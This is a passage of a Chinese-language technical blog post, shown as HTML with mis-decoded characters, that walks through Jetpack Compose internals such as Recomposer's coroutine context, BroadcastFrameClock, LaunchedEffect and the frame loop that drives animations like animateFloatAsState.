     * Recomposer å†…éƒ¨åˆ›å»ºçš„ Jobï¼Œä½œä¸ºæ‰€æœ‰å‰¯ä½œç”¨åç¨‹çš„çˆ¶ Job
     *
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> effectJob = Job(effectCoroutineContext[Job])
    
    <span class="hljs-comment">// åˆ›å»º BroadcastFrameClock</span>
    <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ MonotonicFrameClock å®ç°ï¼Œå®ƒä¸ä»…èƒ½æä¾›å¸§æ—¶é—´ï¼Œ</span>
    <span class="hljs-comment">// è¿˜èƒ½è¢«"é©±åŠ¨"ï¼ˆé€šè¿‡ sendFrame æ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> broadcastFrameClock = BroadcastFrameClock {
        <span class="hljs-comment">// onNewAwaiters å›è°ƒï¼šå½“æœ‰åç¨‹è°ƒç”¨ withFrameNanos æŒ‚èµ·ç­‰å¾…æ—¶è§¦å‘</span>
        synchronized(stateLock) {
            <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªå”¤é†’æœºåˆ¶ï¼š</span>
            <span class="hljs-comment">// å½“æœ‰æ–°çš„åŠ¨ç”»ç­‰å¾…å¸§æ—¶ï¼Œéœ€è¦å”¤é†’ Recomposer çš„ä¸»å¾ªç¯</span>
            deriveStateLocked().also {
                <span class="hljs-comment">// å¦‚æœ Recomposer å¤„äºç­‰å¾…çŠ¶æ€ï¼Œå”¤é†’å®ƒ</span>
                <span class="hljs-keyword">if</span> (_state.value &lt;= State.ShuttingDown)
                    workContinuation?.resume(<span class="hljs-built_in">Unit</span>)
            }
        }
    }
    

<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> effectCoroutineContext: CoroutineContext =
    effectCoroutineContext + broadcastFrameClock + effectJob  
</code></pre>
<p><code>effectCoroutineContext</code>æˆäº†<code>effectCoroutineContext + broadcastFrameClock + effectJob</code>ï¼Œ<code>BroadcastFrameClock</code>å®ç°äº†<code>MonotonicFrameClock</code>ï¼Œåˆåœ¨<code>+</code>æ“ä½œç¬¦çš„å³è¾¹ï¼Œ<code>BroadcastFrameClock</code>è¦†ç›–æ‰äº†<code>PausableMonotonicFrameClock</code>ã€‚æœ€ç»ˆ<code>effectCoroutineContext</code>åŒ…å«äº†<code>AndroidUiDispatcher</code>ã€<code>BroadcastFrameClock</code>ã€<code>effectJob</code>å’Œ<code>MotionDurationScale</code>ã€‚</p>
<h3 data-id="heading-22">3ã€3 Composerè·å–åç¨‹ä¸Šä¸‹æ–‡</h3>
<p><code>Recomposer</code>Â ç»§æ‰¿è‡ª<code>CompositionContext</code>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// CompositionContext.kt</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositionContext</span> {
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> effectCoroutineContext: CoroutineContext
}
</code></pre>
<p>å½“æˆ‘ä»¬åœ¨Â <code>setContent</code>Â ä¸­åˆ›å»ºÂ <code>Composition</code>Â æ—¶ï¼Œä¼šä¼ å…¥Â <code>Recomposer</code>Â ä½œä¸ºçˆ¶ä¸Šä¸‹æ–‡ã€‚<code>Composer</code>Â é€šè¿‡Â <code>parentContext</code>Â è·å–å®ƒã€‚<code>parentContext</code>å°±æ˜¯<code>Recomposer</code>Â </p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Composer.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> applyCoroutineContext: CoroutineContext =
    <span class="hljs-comment">// è·å– Recomposer çš„ effectCoroutineContext</span>
    parentContext.effectCoroutineContext +
    (errorContext ?: EmptyCoroutineContext)
</code></pre>
<p><strong><code>Composer</code>çš„åç¨‹ä¸Šä¸‹æ–‡å°±æ˜¯<code>Recomposer</code>çš„<code>effectCoroutineContext</code>ï¼Œ<code>Composer</code>å’Œ<code>Recomposer</code>çš„åç¨‹ä¸Šä¸‹æ–‡æ˜¯åŒä¸€ä¸ªã€‚</strong></p>
<h3 data-id="heading-23">3ã€4 LaunchedEffect å¦‚ä½•ä½¿ç”¨ä¸Šä¸‹æ–‡</h3>
<h4 data-id="heading-24">3ã€4ã€1 LaunchedEffect çš„æºç åˆ†æ</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// Effects.kt</span>
<span class="hljs-variable">@Composable</span>
<span class="hljs-variable">@NonRestartableComposable</span>
<span class="hljs-variable">@OptIn</span>(<span class="hljs-attribute">InternalComposeApi</span>::class)
public fun <span class="hljs-built_in">LaunchedEffect</span>(<span class="hljs-attribute">key1</span>: Any?, <span class="hljs-attribute">block</span>: suspend CoroutineScope.() -&gt; Unit) {
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šè·å–å½“å‰ Composer çš„ applyCoroutineContext</span>
    <span class="hljs-comment">// è¿™ä¸ªä¸Šä¸‹æ–‡åŒ…å«äº†ä» Recomposer ç»§æ‰¿ä¸‹æ¥çš„ BroadcastFrameClock</span>
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">applyContext</span> = <span class="hljs-selector-tag">currentComposer</span><span class="hljs-selector-class">.applyCoroutineContext</span>
    
    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ remember åˆ›å»ºå¹¶ä¿å­˜ LaunchedEffectImpl</span>
    <span class="hljs-comment">// å½“ key1 å˜åŒ–æ—¶ï¼Œæ—§çš„ LaunchedEffectImpl ä¼šè¢« forgottenï¼ˆåç¨‹å–æ¶ˆï¼‰</span>
    <span class="hljs-comment">// æ–°çš„ LaunchedEffectImpl ä¼šè¢« rememberedï¼ˆåç¨‹å¯åŠ¨ï¼‰</span>
    <span class="hljs-selector-tag">remember</span>(key1) { <span class="hljs-selector-tag">LaunchedEffectImpl</span>(applyContext, block) }
}
</code></pre>
<h4 data-id="heading-25">3ã€4ã€2 LaunchedEffectImplçš„æºç åˆ†æ</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Effects.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LaunchedEffectImpl</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> parentCoroutineContext: CoroutineContext,  <span class="hljs-comment">// â† ä» Composer è·å–çš„ä¸Šä¸‹æ–‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> task: <span class="hljs-keyword">suspend</span> CoroutineScope.() -&gt; <span class="hljs-built_in">Unit</span>,
) : RememberObserver, CoroutineExceptionHandler {
    
    <span class="hljs-comment">// åˆ›å»ºåç¨‹ä½œç”¨åŸŸ</span>
    <span class="hljs-comment">// è¿™ä¸ª scope çš„ä¸Šä¸‹æ–‡åŒ…å«äº† BroadcastFrameClock</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(
        parentCoroutineContext +  <span class="hljs-comment">// â† åŒ…å« BroadcastFrameClock</span>
            <span class="hljs-keyword">if</span> (parentCoroutineContext[CompositionErrorContextImpl] != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">this</span>  <span class="hljs-comment">// æ·»åŠ è‡ªå·±ä½œä¸ºå¼‚å¸¸å¤„ç†å™¨</span>
            } <span class="hljs-keyword">else</span> {
                EmptyCoroutineContext
            }
    )
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> job: Job? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// å½“ LaunchedEffectImpl è¢« remember æ—¶è°ƒç”¨</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onRemembered</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// å®‰å…¨æ£€æŸ¥ï¼šå–æ¶ˆå¯èƒ½å­˜åœ¨çš„æ—§ä»»åŠ¡</span>
        job?.cancel(<span class="hljs-string">"Old job was still running!"</span>)
        
        <span class="hljs-comment">// å¯åŠ¨æ–°åç¨‹</span>
        <span class="hljs-comment">// è¿™ä¸ªåç¨‹ç»§æ‰¿äº† scope çš„ä¸Šä¸‹æ–‡</span>
        <span class="hljs-comment">// å› æ­¤å®ƒå¯ä»¥é€šè¿‡ coroutineContext[MonotonicFrameClock] è·å– BroadcastFrameClock</span>
        job = scope.launch(block = task)
    }

    <span class="hljs-comment">// å½“ LaunchedEffectImpl è¢« forget æ—¶è°ƒç”¨</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onForgotten</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// å–æ¶ˆåç¨‹</span>
        job?.cancel(LeftCompositionCancellationException())
        job = <span class="hljs-literal">null</span>
    }

    <span class="hljs-comment">// å½“ç»„åˆè¢«æ”¾å¼ƒæ—¶è°ƒç”¨</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAbandoned</span><span class="hljs-params">()</span></span> {
        job?.cancel(LeftCompositionCancellationException())
        job = <span class="hljs-literal">null</span>
    }

    <span class="hljs-comment">// å¼‚å¸¸å¤„ç†</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key: CoroutineContext.Key&lt;*&gt;
        <span class="hljs-keyword">get</span>() = CoroutineExceptionHandler.Key

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleException</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>, exception: <span class="hljs-type">Throwable</span>)</span></span> {
        <span class="hljs-comment">// å¤„ç†æœªæ•è·çš„å¼‚å¸¸</span>
        context[CompositionErrorContextImpl]?.apply {
            exception.attachComposeStackTrace(<span class="hljs-keyword">this</span><span class="hljs-symbol">@LaunchedEffectImpl</span>)
        }
        parentCoroutineContext[CoroutineExceptionHandler]?.handleException(context, exception)
            ?: <span class="hljs-keyword">throw</span> exception
    }
}
</code></pre>
<h4 data-id="heading-26">3ã€4ã€3 LaunchedEffectImplçš„åç¨‹ä½œç”¨åŸŸåˆ†æ</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// LaunchedEffectImpl ä¸­çš„ scope çš„ä¸Šä¸‹æ–‡ç»“æ„</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(parentCoroutineContext + ...)

<span class="hljs-comment">// parentCoroutineContext æ¥è‡ª currentComposer.applyCoroutineContext</span>
<span class="hljs-comment">// å…¶åŒ…å«ï¼š</span>
<span class="hljs-comment">// â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-comment">// â”‚ ContinuationInterceptor (Dispatchers.Main) â”‚</span>
<span class="hljs-comment">// â”‚ MonotonicFrameClock (BroadcastFrameClock)  â”‚  â† å…³é”®ï¼</span>
<span class="hljs-comment">// â”‚ Job (æ¥è‡ª Recomposer.effectJob)            â”‚</span>
<span class="hljs-comment">// â”‚ MotionDurationScale (å¯é€‰)         â”‚</span>
<span class="hljs-comment">// â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre>
<p><strong><code>LaunchedEffect</code>ä½¿ç”¨çš„æ˜¯Composerçš„åç¨‹ä¸Šä¸‹æ–‡ï¼Œ<code>Composer</code>çš„åç¨‹ä¸Šä¸‹æ–‡æ˜¯<code>Recomposer</code>çš„åç¨‹ä¸Šä¸‹æ–‡ã€‚</strong></p>
<h3 data-id="heading-27">3ã€5 BroadcastFrameClockçš„è¯¦ç»†å·¥ä½œåŸç†</h3>
<p><code>BroadcastFrameClock</code>Â æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„Â <code>MonotonicFrameClock</code>Â å®ç°ï¼Œå®ƒä¸ä»…èƒ½è®©åç¨‹ç­‰å¾…å¸§ï¼Œè¿˜èƒ½è¢«å¤–éƒ¨é©±åŠ¨æ¥åˆ†å‘å¸§ä¿¡å·ã€‚è®©æˆ‘ä»¬æ·±å…¥åˆ†æå®ƒçš„æºç ã€‚</p>
<h4 data-id="heading-28">3ã€5ã€1 BroadcastFrameClock çš„æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// BroadcastFrameClock.kt</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BroadcastFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> onNewAwaiters: (() -&gt; <span class="hljs-built_in">Unit</span>)? = <span class="hljs-literal">null</span>) : MonotonicFrameClock {
    
    <span class="hljs-comment">// ç®¡ç†ç­‰å¾…å¸§çš„åç¨‹</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lock = makeSynchronizedObject()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> failureCause: Throwable? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> pendingAwaitersCountUnlocked = AtomicAwaitersCount()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> awaiters = mutableObjectListOf&lt;FrameAwaiter&lt;*&gt;&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> spareList = mutableObjectListOf&lt;FrameAwaiter&lt;*&gt;&gt;()
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> hasAwaiters: <span class="hljs-built_in">Boolean</span>
        <span class="hljs-keyword">get</span>() = pendingAwaitersCountUnlocked.hasAwaiters()
}
</code></pre>
<p><strong>å…³é”®ç»„ä»¶ï¼š</strong></p>
<ul>
<li><strong>awaiters åˆ—è¡¨</strong>ï¼šå­˜å‚¨æ‰€æœ‰å½“å‰æ­£åœ¨ç­‰å¾…å¸§çš„åç¨‹ï¼ˆ<code>FrameAwaiter</code>ï¼‰ã€‚</li>
<li><strong>AtomicAwaitersCount</strong>ï¼šåŸå­è®¡æ•°å™¨ï¼Œç”¨äºé«˜æ•ˆåœ°è·Ÿè¸ªç­‰å¾…è€…æ•°é‡ï¼Œé¿å…é¢‘ç¹åŠ é”ã€‚</li>
<li><strong>onNewAwaiters å›è°ƒ</strong>ï¼šå½“ç­‰å¾…è€…æ•°é‡ä» 0 å˜ä¸º 1 æ—¶è§¦å‘ï¼Œç”¨äºå”¤é†’ Recomposerã€‚</li>
</ul>
<h4 data-id="heading-29">3ã€5ã€2 withFrameNanosï¼šåç¨‹å¦‚ä½•ç­‰å¾…å¸§</h4>
<p>å½“åŠ¨ç”»è°ƒç”¨Â <code>withFrameNanos</code>Â æ—¶ï¼Œå®ƒä¼šæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶å°†å…¶æ³¨å†Œåˆ°ç­‰å¾…åˆ—è¡¨ä¸­ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
        suspendCancellableCoroutine { co -&gt;
            <span class="hljs-comment">// 1. åˆ›å»ºä¸€ä¸ª FrameAwaiterï¼ŒåŒ…è£…åç¨‹å’Œå›è°ƒ</span>
            <span class="hljs-keyword">val</span> awaiter = FrameAwaiter(onFrame, co)
            <span class="hljs-keyword">var</span> hasNewAwaiters = <span class="hljs-literal">false</span>
            <span class="hljs-keyword">var</span> awaitersVersion = -<span class="hljs-number">1</span>
            
            synchronized(lock) {
                <span class="hljs-comment">// 2. æ£€æŸ¥æ˜¯å¦å·²ç»å¤±è´¥</span>
                <span class="hljs-keyword">val</span> cause = failureCause
                <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) {
                    co.resumeWithException(cause)
                    <span class="hljs-keyword">return</span><span class="hljs-symbol">@suspendCancellableCoroutine</span>
                }
                
                <span class="hljs-comment">// 3. å¢åŠ ç­‰å¾…è€…è®¡æ•°ï¼Œå¹¶è·å–ç‰ˆæœ¬å·</span>
                awaitersVersion =
                    pendingAwaitersCountUnlocked.incrementCountAndGetVersion(
                        ifFirstAwaiter = { hasNewAwaiters = <span class="hljs-literal">true</span> }  <span class="hljs-comment">// å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…ï¼Œæ ‡è®°</span>
                    )
                
                <span class="hljs-comment">// 4. å°† awaiter åŠ å…¥ç­‰å¾…åˆ—è¡¨</span>
                awaiters.add(awaiter)
            }

            <span class="hljs-comment">// 5. è®¾ç½®å–æ¶ˆå›è°ƒ</span>
            co.invokeOnCancellation {
                awaiter.cancel()
                pendingAwaitersCountUnlocked.decrementCount(awaitersVersion)
            }

            <span class="hljs-comment">// 6. å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…ï¼Œè§¦å‘ onNewAwaiters å›è°ƒ</span>
            <span class="hljs-comment">// è¿™ä¼šå”¤é†’ Recomposer çš„ä¸»å¾ªç¯</span>
            <span class="hljs-keyword">if</span> (hasNewAwaiters &amp;&amp; onNewAwaiters != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">try</span> {
                    onNewAwaiters.invoke()
                } <span class="hljs-keyword">catch</span> (t: Throwable) {
                    fail(t)
                }
            }
        }
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç‰ˆæœ¬å·æœºåˆ¶</strong>ï¼š<code>awaitersVersion</code>Â ç”¨äºå¤„ç†å¹¶å‘å–æ¶ˆã€‚å¦‚æœåç¨‹åœ¨ç­‰å¾…æœŸé—´è¢«å–æ¶ˆï¼Œåªæœ‰å½“ç‰ˆæœ¬å·åŒ¹é…æ—¶æ‰ä¼šå‡å°‘è®¡æ•°ï¼Œé¿å…è¯¯å‡ã€‚</li>
<li><strong>å”¤é†’æœºåˆ¶</strong>ï¼š<code>hasNewAwaiters</code>Â æ ‡å¿—ç¡®ä¿åªåœ¨ç¬¬ä¸€ä¸ªç­‰å¾…è€…åŠ å…¥æ—¶å”¤é†’ Recomposerï¼Œé¿å…é‡å¤å”¤é†’ã€‚</li>
</ul>
<h4 data-id="heading-30">3ã€5ã€3 sendFrameï¼šRecomposer å¦‚ä½•é©±åŠ¨å¸§</h4>
<p>å½“ <code>Recomposer</code> ä»ç³»ç»Ÿè·å–åˆ°å¸§ä¿¡å·åï¼Œå®ƒä¼šè°ƒç”¨Â <code>sendFrame</code>Â æ¥å”¤é†’æ‰€æœ‰ç­‰å¾…çš„åŠ¨ç”»åç¨‹ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendFrame</span><span class="hljs-params">(timeNanos: <span class="hljs-type">Long</span>)</span></span> {
        synchronized(lock) {
            <span class="hljs-comment">// 1. äº¤æ¢åˆ—è¡¨ï¼šå°†å½“å‰ç­‰å¾…åˆ—è¡¨ä¸å¤‡ç”¨åˆ—è¡¨äº¤æ¢</span>
            <span class="hljs-comment">// è¿™æ ·å¯ä»¥é¿å…åœ¨æ¢å¤åç¨‹æ—¶æ–°åç¨‹åŠ å…¥å¯¼è‡´çš„é—®é¢˜</span>
            <span class="hljs-keyword">val</span> toResume = awaiters
            awaiters = spareList
            spareList = toResume
            
            <span class="hljs-comment">// 2. é‡ç½®è®¡æ•°å™¨å¹¶å¢åŠ ç‰ˆæœ¬å·</span>
            pendingAwaitersCountUnlocked.incrementVersionAndResetCount()

            <span class="hljs-comment">// 3. æ¢å¤æ‰€æœ‰ç­‰å¾…çš„åç¨‹</span>
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
                toResume[i].resume(timeNanos)
            }
            
            <span class="hljs-comment">// 4. æ¸…ç©ºåˆ—è¡¨</span>
            toResume.clear()
        }
    }
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åˆ—è¡¨äº¤æ¢</strong>ï¼šä½¿ç”¨åŒåˆ—è¡¨æŠ€æœ¯ï¼ˆ<code>awaiters</code>Â å’ŒÂ <code>spareList</code>ï¼‰æ¥é¿å…å¹¶å‘é—®é¢˜ã€‚å½“æ¢å¤åç¨‹æ—¶ï¼Œæ–°åç¨‹å¯ä»¥åŠ å…¥æ–°çš„Â <code>awaiters</code>Â åˆ—è¡¨ï¼Œè€Œä¸ä¼šå¹²æ‰°å½“å‰çš„æ¢å¤è¿‡ç¨‹ã€‚</li>
<li><strong>åŒæ­¥æ¢å¤</strong>ï¼šæ‰€æœ‰åç¨‹éƒ½åœ¨Â <code>sendFrame</code>Â è°ƒç”¨æœŸé—´åŒæ­¥æ¢å¤ï¼Œç¡®ä¿å®ƒä»¬åœ¨åŒä¸€å¸§å†…æ‰§è¡Œã€‚</li>
</ul>
<h3 data-id="heading-31">3ã€6 Recomposerçš„å¸§å¾ªç¯</h3>
<p><strong>parentFrameClockä¸ºä»€ä¹ˆæ˜¯PausableMonotonicFrameClockï¼Ÿ</strong></p>
<p>é¦–å…ˆè¦çŸ¥é“<code>runRecomposeAndApplyChanges</code>åœ¨å“ªä¸ªåç¨‹ä¸­æ‰§è¡Œï¼Œåœ¨3ã€1ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†<code>contextWithClockAndMotionScale</code>ï¼Œ<code>contextWithClockAndMotionScale</code>åŒ…å«äº†<code>AndroidUiDispatcher</code>ã€<code>PausableMonotonicFrameClock</code>å’Œ<code>MotionDurationScale</code>ã€‚æ¥ç€åˆ›å»ºäº†ä½¿ç”¨<code>contextWithClockAndMotionScale</code>åˆ›å»ºäº†åç¨‹ä½œç”¨åŸŸå¯¹è±¡ï¼Œå¼€å¯äº†åç¨‹ï¼Œè°ƒç”¨<code>runRecomposeAndApplyChanges</code>ï¼Œ<code>parentFrameClock</code>å°±æ˜¯<code>PausableMonotonicFrameClock</code>äº†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Recomposer.kt</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runRecomposeAndApplyChanges</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Unit</span> =
    recompositionRunner { parentFrameClock -&gt;
        <span class="hljs-comment">// parentFrameClockæ˜¯PausableMonotonicFrameClock</span>
        
        <span class="hljs-keyword">while</span> (shouldKeepRecomposing) {
            awaitWorkAvailable()  <span class="hljs-comment">// ç­‰å¾…æœ‰å·¥ä½œéœ€è¦åš</span>

            <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å¸§ç›¸å…³çš„å·¥ä½œï¼Œç»§ç»­ç­‰å¾…</span>
            <span class="hljs-keyword">if</span> (!recordComposerModifications()) <span class="hljs-keyword">continue</span>

            <span class="hljs-comment">// ç­‰å¾…ä¸‹ä¸€å¸§ï¼šä¸æ˜¾ç¤ºåˆ·æ–°ç‡å¯¹é½</span>
            parentFrameClock.withFrameNanos { frameTime -&gt;
                
                <span class="hljs-comment">// 1. é¦–å…ˆåˆ†å‘åŠ¨ç”»å¸§</span>
                <span class="hljs-keyword">if</span> (hasBroadcastFrameClockAwaiters) {
                    trace(<span class="hljs-string">"Recomposer:animation"</span>) {
                        <span class="hljs-comment">// å‘æ‰€æœ‰åŠ¨ç”»å¹¿æ’­å¸§æ—¶é—´</span>
                        broadcastFrameClock.sendFrame(frameTime)

                        <span class="hljs-comment">// ç¡®ä¿è§‚å¯Ÿåˆ°æ‰€æœ‰å…¨å±€çŠ¶æ€å˜åŒ–</span>
                        Snapshot.sendApplyNotifications()
                    }
                }

                <span class="hljs-comment">// 2. ç„¶åæ‰§è¡Œé‡ç»„</span>
                trace(<span class="hljs-string">"Recomposer:recompose"</span>) {
                    <span class="hljs-comment">// è®°å½•éœ€è¦é‡ç»„çš„ Composer</span>
                    recordComposerModifications()
                    synchronized(stateLock) {
                        compositionInvalidations.forEach { toRecompose += it }
                        compositionInvalidations.clear()
                    }

                    <span class="hljs-comment">// æ‰§è¡Œé‡ç»„</span>
                    <span class="hljs-keyword">while</span> (toRecompose.isNotEmpty() || toInsert.isNotEmpty()) {
                        toRecompose.fastForEach { composition -&gt;
                            performRecompose(composition, modifiedValues)?.let {
                                toApply += it
                            }
                        }
                        toRecompose.clear()
                        <span class="hljs-comment">// ... æ’å…¥ç§»åŠ¨å†…å®¹ç­‰</span>
                    }

                    <span class="hljs-comment">// 3. åº”ç”¨å˜æ›´åˆ° UI æ ‘</span>
                    <span class="hljs-keyword">if</span> (toApply.isNotEmpty()) {
                        changeCount++
                        toApply.fastForEach { composition -&gt;
                            composition.applyChanges()
                        }
                        toApply.clear()
                    }
                }
            }
        }
    }
</code></pre>
<p><strong>çŸ¥é“äº†<code>MonotonicFrameClock</code>å¸§æ—¶é’Ÿå’Œ<code>Recomposer</code>åç¨‹ä¸Šä¸‹æ–‡ï¼Œæ¥ä¸‹æ¥å°±æ¥çœ‹åŠ¨ç”»çš„å®ç°åŸç†äº†</strong>ã€‚</p>
<h2 data-id="heading-32">å››ã€åŠ¨ç”»åŸç†</h2>
<h3 data-id="heading-33">4ã€1 æ¥ä¸ªä¾‹å­</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MyButton</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> isPressed <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    
    <span class="hljs-comment">// å½“ isPressed æ”¹å˜æ—¶ï¼Œscale ä¼šå¹³æ»‘è¿‡æ¸¡</span>
    <span class="hljs-keyword">val</span> scale <span class="hljs-keyword">by</span> animateFloatAsState(
        targetValue = <span class="hljs-keyword">if</span> (isPressed) <span class="hljs-number">1.2f</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1f</span>
    )
    
    Box(
        modifier = Modifier
            .scale(scale)  <span class="hljs-comment">// ä½¿ç”¨åŠ¨ç”»å€¼</span>
            .clickable { isPressed = !isPressed }
    ) {
        Text(<span class="hljs-string">"ç‚¹æˆ‘"</span>)
    }
}
</code></pre>
<p>å‡è®¾ä½ å†™äº†è¿™æ ·çš„ä»£ç ï¼š
<strong>ä½ å¯èƒ½çš„ç–‘é—®ï¼š</strong></p>
<ol>
<li>â“Â <code>animateFloatAsState</code>Â è¿”å›çš„Â <code>scale</code>Â æ˜¯æ€ä¹ˆè‡ªåŠ¨å˜åŒ–çš„ï¼Ÿ</li>
<li>â“ ä¸ºä»€ä¹ˆæ¯æ¬¡Â <code>scale</code>Â å˜åŒ–ï¼ŒUI å°±ä¼šè‡ªåŠ¨æ›´æ–°ï¼Ÿ</li>
<li>â“ åŠ¨ç”»æ˜¯æ€ä¹ˆåšåˆ° 60fps å¹³æ»‘è¿è¡Œçš„ï¼Ÿ</li>
</ol>
<p>è®©æˆ‘ä¸€æ­¥æ­¥è§£ç­”è¿™äº›é—®é¢˜ã€‚</p>
<h3 data-id="heading-34">4ã€2 animateFloatAsState</h3>
<p>æºç ç®€åŒ–ç‰ˆï¼Œä¿ç•™æ ¸å¿ƒé€»è¾‘ã€‚ä½¿ç”¨LaunchedEffectå¼€å¯åç¨‹ï¼Œå¦‚æœå¯¹å‰¯ä½œç”¨ä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://juejin.cn/post/7599017594519322650" target="_blank" title="https://juejin.cn/post/7599017594519322650">ComposeåŸç†äº”ä¹‹å‰¯ä½œç”¨</a>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animateFloatAsState</span><span class="hljs-params">(targetValue: <span class="hljs-type">Float</span>)</span></span>: State&lt;<span class="hljs-built_in">Float</span>&gt; {
    <span class="hljs-comment">// æ­¥éª¤1ï¼šåˆ›å»ºä¸€ä¸ª"åŠ¨ç”»çŠ¶æ€å®¹å™¨"ï¼ˆåªåˆ›å»ºä¸€æ¬¡ï¼‰</span>
    <span class="hljs-keyword">val</span> animatable = remember { Animatable(initialValue = targetValue) }
    
    <span class="hljs-comment">// æ­¥éª¤2ï¼šåˆ›å»ºä¸€ä¸ª"ç›®æ ‡å€¼ä¼ è¾“é€šé“"ï¼ˆåªåˆ›å»ºä¸€æ¬¡ï¼‰</span>
    <span class="hljs-keyword">val</span> channel = remember { Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED) }
    
    <span class="hljs-comment">// æ­¥éª¤3ï¼šæ¯æ¬¡é‡ç»„æ—¶ï¼ŒæŠŠæ–°çš„ç›®æ ‡å€¼å‘é€åˆ°é€šé“</span>
    SideEffect { 
        channel.trySend(targetValue) 
    }
    
